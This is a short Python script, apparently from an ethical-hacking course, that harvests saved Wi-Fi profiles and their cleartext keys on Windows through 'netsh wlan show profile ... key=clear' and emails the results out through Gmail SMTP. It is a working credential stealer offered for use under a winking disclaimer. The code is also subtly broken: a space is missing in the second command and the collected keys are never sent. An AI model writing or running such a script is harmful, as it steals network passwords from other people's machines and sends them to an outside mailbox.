#!/usr/bin/env python
# -*- encoding: utf-8 -*-

##############################################################################
#                                                                            #
#                                 py & EH                                    #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
# this program work on all OS's
import re
import smtplib
import subprocess


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_list = re.findall("(?:Profile\s*:\S*)(.*)", networks)
send_mail("testemail@gmail.com", "testpassword1234", networks)
# navigate to google account security settings and setup app login to
# generate new password for the app use while reporting back to your email

final_result = ""
for network_name in networks_list:
    command = "netsh wlan show profile" + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    final_result = final_result + current_result

